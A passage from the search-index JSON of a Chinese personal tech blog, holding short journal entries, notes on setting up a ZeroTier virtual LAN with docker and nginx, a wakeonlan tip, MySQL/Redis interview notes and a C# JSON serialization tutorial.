的人完全用不上这样的工具. 可想而知… 来源: https://sspai.com/post/83956 奇葩的新闻播报 被裁员, 想要缴社保需要连续满 5 年. 作者不满 5 年… 微信小程序\u003c失业指南\u003e可以帮到你. 失业金有医保, 社保. 重新就业还能提取! 但是失业金很难拿 #科技/折腾 (23) 【家庭影院】【VIP游戏厅】硬件、软件、片源，一条视频玩明白！ - YouTube #生活/付费 流量卡 各大运营商的流量卡 小米网络助手, 电话卡秒变流量神器. 小米移动. 限速 4g 网络 ","date":"2023-11-09","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-09/:0:0","series":null,"tags":["journal"],"title":"2023-11-09","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-09/#"},{"categories":["journal"],"content":"2023-11-08 日记","date":"2023-11-08","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-08/","series":null,"tags":["journal"],"title":"2023-11-08","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-08/"},{"categories":["journal"],"content":"#fun 欧洲负电价 Rooftop solar ‘cannibalising’ power prices as Australian generators pay to stay online - ABC News #生活/医 颈椎病腰突康复指南 ","date":"2023-11-08","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-08/:0:0","series":null,"tags":["journal"],"title":"2023-11-08","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-08/#"},{"categories":["journal"],"content":"2023-11-07 日记","date":"2023-11-07","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-07/","series":null,"tags":["journal"],"title":"2023-11-07","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-07/"},{"categories":["journal"],"content":"#lines windows 自带的截图工具, 可以识别图片中文字的位置, 并复制拷贝. #fun/旅游助手 位于山西运城平陆县的非著名深沟-“划沟”，整体长约10公里-今日头条 (toutiao.com) ","date":"2023-11-07","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-07/:0:0","series":null,"tags":["journal"],"title":"2023-11-07","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-07/#"},{"categories":["journal"],"content":"2023-11-06 日记","date":"2023-11-06","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-06/","series":null,"tags":["journal"],"title":"2023-11-06","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-06/"},{"categories":["journal"],"content":"#lines 全球知名的站点, 也会有服务停摆: https://m.cnbeta.com.tw/view/1394635.htm Post Mortem on Cloudflare Control Plane and Analytics Outage — Cloudflare 控制平面和分析中断事后分析 电脑病毒专业性很强: https://blogread.cn/news/go.php?idItem=15925\u0026url=https%3A%2F%2Fpaper.seebug.org%2F3061%2F%3Fcomefrom%3Dhttps%253A%252F%252Fblogread.cn%252Fnews%252F 斗鱼 ceo 陈少杰失联了 3 周. 排除掉人身意外的情况, 有哪几个国家/地区会出现这样的情况? ","date":"2023-11-06","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-06/:0:0","series":null,"tags":["journal"],"title":"2023-11-06","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-06/#"},{"categories":["journal"],"content":"2023-11-05 日记","date":"2023-11-05","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-05/","series":null,"tags":["journal"],"title":"2023-11-05","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-05/"},{"categories":["journal"],"content":"#生活/医 我不喜欢中医: 想找个老中医给号号脉 - V2EX 口腔溃疡: 舌尖有一个溃疡，说话都疼，有没有什么快速缓解办法？ - V2EX ","date":"2023-11-05","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-05/:0:0","series":null,"tags":["journal"],"title":"2023-11-05","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-05/#"},{"categories":["blog"],"content":"`TestServer` 是我写的一个 web 工具. 方便我日常调试.","date":"2023-11-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/testserver%E5%B7%A5%E5%85%B7/","series":null,"tags":["blog"],"title":"TestServer工具","uri":"/posts/%E7%AC%94%E8%AE%B0/testserver%E5%B7%A5%E5%85%B7/"},{"categories":["blog"],"content":" 简介TestServer 是我写的一个 web 工具. 方便我日常调试. 后续会开源出来, 再写完这个笔记. https://github.com/kentxxq/TestServer ","date":"2023-11-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/testserver%E5%B7%A5%E5%85%B7/:1:0","series":null,"tags":["blog"],"title":"TestServer工具","uri":"/posts/%E7%AC%94%E8%AE%B0/testserver%E5%B7%A5%E5%85%B7/#简介"},{"categories":["blog"],"content":" 内容#todo/笔记 ","date":"2023-11-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/testserver%E5%B7%A5%E5%85%B7/:2:0","series":null,"tags":["blog"],"title":"TestServer工具","uri":"/posts/%E7%AC%94%E8%AE%B0/testserver%E5%B7%A5%E5%85%B7/#内容"},{"categories":["journal"],"content":"2023-10-27 日记","date":"2023-10-27","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-27/","series":null,"tags":["journal"],"title":"2023-10-27","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-27/"},{"categories":["journal"],"content":"#fun 前几次相亲都失败了，因为大家用的手机不一样。 我带苹果时，对方正好用华为；我带华为时，对方恰好用苹果。 对方拒绝的理由都是：道不同不相为谋。 所以这次相亲，我同时带了苹果和华为。 我把两个手机藏在包里，我的计划是：对方用哪个，我就拿哪个，尽量保持一致。 但我知道，事情肯定没那么简单，对方可能会同时亮出两个手机，此时如何判断对方的立场？ 其实也不难，只要观察对方如何摆放。 如果是叠放，看看谁压谁。比如华为在上面，表示华为压苹果一头，暗示对方更支持华为。 如果左右并排，位次也有讲究。在国内，左为尊；在国外，右为大。通过这个规律也可以判断对方的立场。 我进了咖啡店，一个漂亮女生坐在桌子对面，桌子却没有摆放任何手机。 我有点慌，难道对方也跟我一样，把手机藏在包里？ 如果我们都不暴露身份，那如何判断是否志同道合？ 正当我疑惑时，她开始从包里掏东西。 她掏出一台精妙的机械旋转装置，上面有两台手机，一台苹果，一台华为；两台手机正在这个装置里进行无规律地旋转，我再三确认，两台手机不存在叠放，也不存在上下左右，运动轨迹处于混沌状态。 我根本无法判断哪台是她的主力机。 情况开始有点复杂了。 难道她的立场处于量子叠加状态？还是说她有明确的立场，此举只想试探我的反应？ 这是一个饵，她在让我咬。 接下来我必须要非常小心，我的任何一个动作，都可能会暴露身份。 但我也并非等闲之辈，我悄悄把手伸进包里，进行了一番盲操。 此时，她的其中一台手机显示来电。是苹果。 看来，苹果是她的主力机。 我在没有暴露身份的情况下，探测出了她的果粉身份。 她的表情从一开始的得意，到震惊，再到恐慌。 她不知道我是怎么做到的。 她掀掉桌子，一个箭步上前，摁住了我在包里的手。 她尖叫着发疯：别装了！让我看看你是什么成分！ 她把我的手从包里揪了出来。看着我手上的手机，她傻眼了。 “不可能”，她瘫坐在地，披头散发，“你到底是谁？你手上拿的到底是什么设备？” 我说：“诺基亚 3210 。不然你以为我为什么可以盲打？” 她问：“诺基亚？用诺基亚的人是什么成分？” 我给她看了看诺基亚的开机画面，是两只手牵在一起。 我说：“人与人之间，应该携手同行。手机被发明出来，其初心是为了对话和沟通，而不是用来给人划成分。” ","date":"2023-10-27","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-27/:0:0","series":null,"tags":["journal"],"title":"2023-10-27","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-27/#"},{"categories":["journal"],"content":"2023-10-18 日记","date":"2023-10-18","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-18/","series":null,"tags":["journal"],"title":"2023-10-18","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-18/"},{"categories":["journal"],"content":"#fun/影片 非洲旅游. 美景/朋友/坚持/阅历 带保镖去非洲自驾，被黑人警察盘查，只因开中国车？【非洲第1集】_哔哩哔哩_bilibili 比“狮子王”更残酷，真实的动物大迁徙有多震撼…【非洲第2集】_哔哩哔哩_bilibili 我们登上了非洲最高峰！【非洲完结篇】_哔哩哔哩_bilibili 很好的采访影片 对谈百亿大佬：从技术天才到全球第一语言APP，他真的很不一样～_哔哩哔哩_bilibili ","date":"2023-10-18","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-18/:0:0","series":null,"tags":["journal"],"title":"2023-10-18","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-18/#"},{"categories":["blog"],"content":"起因是公司两个隔得很远的房间的两个电脑需要在同一个局域网. 公司很多条独立的宽带. 而走线麻烦还丑. 是一个临时需求. 所以就想起来了有虚拟局域网.","date":"2023-10-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/","series":null,"tags":["blog","网络"],"title":"虚拟局域网","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/"},{"categories":["blog"],"content":" 简介起因是公司两个隔得很远的房间的两个电脑需要在同一个局域网. 公司很多条独立的宽带. 而走线麻烦还丑. 是一个临时需求. 所以就想起来了有虚拟局域网. 有的几个方案: ntop/n2n: Peer-to-peer VPN (github.com) Tailscale ZeroTier | Global Area Networking fatedier/frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet. (github.com) 现阶段我简单对比了一下, ZeroTier 是比较简答直观的. 所以就它了 ","date":"2023-10-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/:1:0","series":null,"tags":["blog","网络"],"title":"虚拟局域网","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/#简介"},{"categories":["blog"],"content":" ZeroTier 搭建","date":"2023-10-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/:2:0","series":null,"tags":["blog","网络"],"title":"虚拟局域网","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/#zerotier-搭建"},{"categories":["blog"],"content":" 部署ZeroTier 并没有自带 UI 界面. 而有第三方做了集成的镜像. 官方文档和代码 在这里 # 密码123456 docker run --restart=always -d --name ztncui -v /data/ztncui:/opt/key-networks/ztncui/etc -v /data/zt1:/var/lib/zerotier-one -e HTTP_PORT=4000 -e HTTP_ALL_INTERFACES=yes -e ZTNCUI_PASSWD=123456 -p 4000:4000 keynetworks/ztncui nginx 代理配置 server { listen 80; server_name ztncui.kentxxq.com; return 301 https://$server_name$request_uri; include /usr/local/nginx/conf/options/normal.conf; access_log /usr/local/nginx/conf/hosts/logs/ztncui.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name ztncui.kentxxq.com; include /usr/local/nginx/conf/options/ssl_kentxxq_com.conf; access_log /usr/local/nginx/conf/hosts/logs/ztncui.kentxxq.com.log k-json; location / { proxy_set_header Host $host; proxy_pass http://10.0.1.152:4000; } } ","date":"2023-10-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/:2:1","series":null,"tags":["blog","网络"],"title":"虚拟局域网","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/#部署"},{"categories":["blog"],"content":" UI 操作 add network 网络名为 kentxxq. 进入 network, 添加 routes. target 为 10.11.12.0/24, Gateway 为 10.11.12.1 下载客户端 客户端 join new network,填入 Network kentxxq ID 号 8e197f4ce6c0bxxx 服务器端: 勾选 Authorized 通过认证. 给机器指定一个固定 ip. 点击 member id 对应的 IP assignment 按钮, 加入 ip 10.11.12.100. 示例如下: ","date":"2023-10-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/:2:2","series":null,"tags":["blog","网络"],"title":"虚拟局域网","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/#ui-操作"},{"categories":["blog"],"content":" 相关资料 ztncui官方 xubiaolin/docker-zerotier-planet: 私有部署zerotier-planet服务 (github.com) Zerotier 搭建私有根服务器及创建虚拟局域网完整教程_mb63e0bfee4d9bf的技术博客_51CTO博客 ","date":"2023-10-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/:3:0","series":null,"tags":["blog","网络"],"title":"虚拟局域网","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91/#相关资料"},{"categories":["journal"],"content":"2023-10-10 日记","date":"2023-10-10","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-10/","series":null,"tags":["journal"],"title":"2023-10-10","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-10/"},{"categories":["journal"],"content":"#fun/旅游助手 旅游好物 https://sspai.com/post/83351 ","date":"2023-10-10","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-10/:0:0","series":null,"tags":["journal"],"title":"2023-10-10","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-10/#"},{"categories":["point"],"content":"芯片是科技的一个重要产物. 因此我喜欢阅读这些内容, 并记录一些有用的信息. 芯片知识和算力 ","date":"2023-10-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%8A%AF%E7%89%87/:0:0","series":null,"tags":["point","芯片"],"title":"芯片","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%8A%AF%E7%89%87/#"},{"categories":["point"],"content":"wakeonlan 是 A 机器发送特殊的包到 B 机器的网卡. 网卡触发开启命令. 使用: # 安装 apt install wakeonlan -y # B机器的网卡地址 wakeonlan D8:BB:C1:9D:6B:F1 ","date":"2023-10-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wakeonlan/:0:0","series":null,"tags":["point","wakeonlan"],"title":"wakeonlan","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wakeonlan/#"},{"categories":["journal"],"content":"2023-10-07 日记","date":"2023-10-07","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-07/","series":null,"tags":["journal"],"title":"2023-10-07","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-07/"},{"categories":["journal"],"content":"#fun/外面的世界 如何保证数据安全? 肉身和数据放在对立面. 例如在国内用 iPhone, icloud 等数据存放美国. 在美国, 数据存放欧洲/中国. 用华为手机. #有意思的句子 你必须意识到恐惧不是真实的, 恐惧是对未来的一种自我暗示. 虽然危险是真实存在的, 但恐惧与否是你的选择. – \u003c重返气球\u003e ","date":"2023-10-07","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-07/:0:0","series":null,"tags":["journal"],"title":"2023-10-07","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-07/#"},{"categories":["blog"],"content":"记录一些面试题,其实也是一些学习要点","date":"2023-10-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95%E9%A2%98/","series":null,"tags":["blog"],"title":"面试题","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["blog"],"content":" 简介记录一些面试题, 其实也是一些学习要点. ","date":"2023-10-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95%E9%A2%98/:1:0","series":null,"tags":["blog"],"title":"面试题","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95%E9%A2%98/#简介"},{"categories":["blog"],"content":" 快速导航 mysql mysql教程 mysql备份恢复 elastic elastic教程 k8s k8s组件剖析 k8s常用命令和配置 k8s的疑难杂症 ","date":"2023-10-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95%E9%A2%98/:2:0","series":null,"tags":["blog"],"title":"面试题","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95%E9%A2%98/#快速导航"},{"categories":["blog"],"content":" mysql","date":"2023-10-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95%E9%A2%98/:3:0","series":null,"tags":["blog"],"title":"面试题","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95%E9%A2%98/#mysql"},{"categories":["blog"],"content":" 为什么 MySQL 有缓存，还要使用 Redis 速度快. mysql 更多是对数据页的缓存. 而 redis 是对结果的缓存. sql 查询和 redis 中的 key 查询效率不一样 可以不存在数据落盘这样的操作, 性能更优 redis 集群查询分片, 而 mysql 需要上层自建分片逻辑 成本低. redis 因为是对结果的缓存, 实际上可以缓存更多有用的数据 相关讨论: 为什么 MySQL 有缓存，还要使用 Redis？ - V2EX ","date":"2023-10-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95%E9%A2%98/:3:1","series":null,"tags":["blog"],"title":"面试题","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95%E9%A2%98/#为什么-mysql-有缓存还要使用-redis"},{"categories":["blog"],"content":" 相关资源 MySQL常见面试题总结 | JavaGuide ","date":"2023-10-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95%E9%A2%98/:3:2","series":null,"tags":["blog"],"title":"面试题","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95%E9%A2%98/#相关资源"},{"categories":["journal"],"content":"2023-10-06 日记","date":"2023-10-06","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-06/","series":null,"tags":["journal"],"title":"2023-10-06","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-06/"},{"categories":["journal"],"content":"#fun/旅游助手 十一去北京待三天，有什么推荐去玩的吗？ - V2EX 孤独星球 #fun/外面的世界 芬兰的见闻 - 来芬兰读 CS 硕一个半月，我的感想和观察 - V2EX 德国毕业难 - 堂弟在德国读硕士 5 年了还在读是咋回事？ - V2EX ","date":"2023-10-06","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-06/:0:0","series":null,"tags":["journal"],"title":"2023-10-06","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-10-06/#"},{"categories":["blog"],"content":"介绍 [[笔记/point/csharp|csharp]] 关于 json 的用法. 本文的所有源码均存放在 [kentxxq/csharpDEMO (github.com)](https://github.com/kentxxq/csharpDEMO). 为什么会有这篇文章? 因为 json 非常的流行, 而且存在有很多细节. 例如性能, 格式, 类库用法等等.","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介介绍 csharp 关于 json 的用法. 本文的所有源码均存放在 kentxxq/csharpDEMO (github.com). 为什么会有这篇文章? 因为 json 非常的流行, 而且存在有很多细节. 例如性能, 格式, 类库用法等等. ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 准备数据准备一个用于演示的示例对象 Person. 同时涵盖了 List, string, int, 枚举, 日期. /// \u003csummary\u003e人\u003c/summary\u003e public class Person { [Display(Name = \"人名\", Description = \"人的名字\")] public string Name { get; set; } = null!; [Display(Name = \"性别\", Description = \"人的性别\")] public Sex SexType { get; set; } [Display(Name = \"生日\", Description = \"人的生日\")] public DateTime Birthday { get; set; } [Display(Name = \"年纪\", Description = \"人的年纪\")] public int Age { get; set; } [Display(Name = \"头\", Description = \"人的头\")] public Head PersonHead { get; set; } = null!; [Display(Name = \"鞋子\", Description = \"人的鞋子\")] public List\u003cShoes\u003e? PersonShoes { get; set; } } /// \u003csummary\u003e头\u003c/summary\u003e public class Head { [Display(Name = \"宽\", Description = \"头的宽\")] public int Width { get; set; } [Display(Name = \"高\", Description = \"头的高\")] public int Height { get; set; } } /// \u003csummary\u003e性别\u003c/summary\u003e public enum Sex { [Display(Name = \"男\")] Man, [Display(Name = \"女\")] Woman } /// \u003csummary\u003e鞋子\u003c/summary\u003e public class Shoes { [Display(Name = \"鞋名\", Description = \"鞋子的名字\")] public string ShoesName { get; set; } = null!; [Display(Name = \"鞋颜色\", Description = \"鞋子的颜色\")] public Color ShoesColor { get; set; } } 初始化一下: public static readonly Person DemoPerson = new() { Name = \"ken\", Age = 1, PersonHead = new Head { Height = 50, Width = 50 }, PersonShoes = new List\u003cShoes\u003e { new() { ShoesColor = Color.Blue, ShoesName = \"蓝色\" }, new() { ShoesColor = Color.Red, ShoesName = \"红色\" } } }; ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#准备数据"},{"categories":["blog"],"content":" 对象/json 互转","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#对象json-互转"},{"categories":["blog"],"content":" 标准做法 // 转json var str = JsonSerializer.Serialize(StaticData.DemoPerson, new JsonSerializerOptions { // 空格 WriteIndented = true, // 宽松转义规则,虽然不规范,但中文会正常打印出来. 否则中文会变成unicode字符,例如'蓝'-'\\u84DD' Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping }); // 转对象 var d1 = JsonSerializer.Deserialize\u003cPerson\u003e(str); 得到字符串 { \"Name\": \"ken\", \"SexType\": 0, \"Birthday\": \"1234-05-06T00:00:00\", \"Age\": 1, \"PersonHead\": { \"Width\": 50, \"Height\": 50 }, \"PersonShoes\": [ { \"ShoesName\": \"蓝色\", \"ShoesColor\": { \"R\": 0, \"G\": 0, \"B\": 255, \"A\": 255, \"IsKnownColor\": true, \"IsEmpty\": false, \"IsNamedColor\": true, \"IsSystemColor\": false, \"Name\": \"Blue\" } }, { \"ShoesName\": \"红色\", \"ShoesColor\": { \"R\": 255, \"G\": 0, \"B\": 0, \"A\": 255, \"IsKnownColor\": true, \"IsEmpty\": false, \"IsNamedColor\": true, \"IsSystemColor\": false, \"Name\": \"Red\" } } ] } ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#标准做法"},{"categories":["blog"],"content":" 源生成#todo/笔记 net8新增UseStringEnumConverter 编写一个 Context 类 [JsonSourceGenerationOptions(WriteIndented = true)] // 全局设置 [JsonSerializable(typeof(Person))] // 需要转换的类 [JsonSerializable(typeof(User))] // 可以多个 internal partial class JsonContext : JsonSerializerContext { } 使用: var s1 = JsonSerializer.Serialize(StaticData.DemoPerson, JsonContext.Default.Person); var o1 = JsonSerializer.Deserialize(s1, JsonContext.Default.Person); var s2 = JsonSerializer.Serialize(StaticData.DemoUser, JsonContext.Default.User); Console.WriteLine(s1); Console.WriteLine(s2); ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:3:2","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#源生成"},{"categories":["blog"],"content":" 自定义类型转换 enum枚举 默认是枚举值 (数字), 使用名称替代 日期/timestamp 互转示例 public class DateTimeJsonConverter2Timestamp : JsonConverter\u003cDateTime\u003e { public override DateTime Read(ref Utf8JsonReader reader, Type typeToConvert, JsonSerializerOptions options) { var tsDatetime = reader.GetInt64().MillisecondsToDateTime(); return tsDatetime; } public override void Write(Utf8JsonWriter writer, DateTime value, JsonSerializerOptions options) { var jsonDateTimeFormat = value.ToTimestampMilliseconds(); writer.WriteNumberValue(jsonDateTimeFormat); } } 推荐使用 JsonConverter 特性: public class WeatherForecastWithConverterAttribute { [JsonConverter(typeof(DateTimeJsonConverter2Timestamp))] public DateTime Date { get; set; } public int TemperatureCelsius { get; set; } public string? Summary { get; set; } } 或加入到 JsonSerializerOptions 中: var opt = new JsonSerializerOptions { // enum用名称,而不是数字表示 Converters = { new JsonStringEnumConverter(JsonNamingPolicy.CamelCase) } }; aspnetcore 使用 services.AddControllers() .AddJsonOptions( opt =\u003e opt.JsonSerializerOptions.Converters.Add(new DateTimeJsonConverter2Timestamp()) ); ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#自定义类型转换"},{"categories":["blog"],"content":" json 字符串数据查询","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:5:0","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#json-字符串数据查询"},{"categories":["blog"],"content":" 如何使用什么情况使用? json 数据没有固定的字段, 或者数据类型. 使用选型: JsonDocument: 只读, 性能更好. JsonNode: 可改动, 且改动方便 在不规范的 json 中, 存在有重复的 key. JsonDocument 取最后一个 key 的值. JsonNode 会报错! ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:5:1","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#如何使用"},{"categories":["blog"],"content":" JsonNode var jNode = JsonNode.Parse(str)!; var name = jNode[\"Name\"]!.GetValue\u003cstring\u003e(); // 修改 jNode[\"Name\"] = \"kent\"; name = jNode[\"Name\"]!.GetValue\u003cstring\u003e(); // 移除, JsonObject继承JsonNode var jObject = jNode.AsObject(); jObject.Remove(\"Name\"); ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:5:2","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#jsonnode"},{"categories":["blog"],"content":" JsonDocument using var jDoc = JsonDocument.Parse(str); name = jDoc.RootElement.GetProperty(\"Name\").Deserialize\u003cstring\u003e(); ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:5:3","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#jsondocument"},{"categories":["blog"],"content":" JsonSerializerOptions 对象#todo/笔记 JsonSerializerOptions.UnmappedMemberHandling Property var opt = new JsonSerializerOptions { // 空格 WriteIndented = true, // 宽松转义规则,虽然不规范,但中文会正常打印出来. 否则中文会变成unicode字符,例如'蓝'-'\\u84DD' Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping, // 下面的不常用 // 默认不包含字段 IncludeFields = true, // 允许存在注释,例如 \"a\":1, // a是id ReadCommentHandling = JsonCommentHandling.Skip, // 允许结尾的逗号 AllowTrailingCommas = true, // 默认大小写不敏感 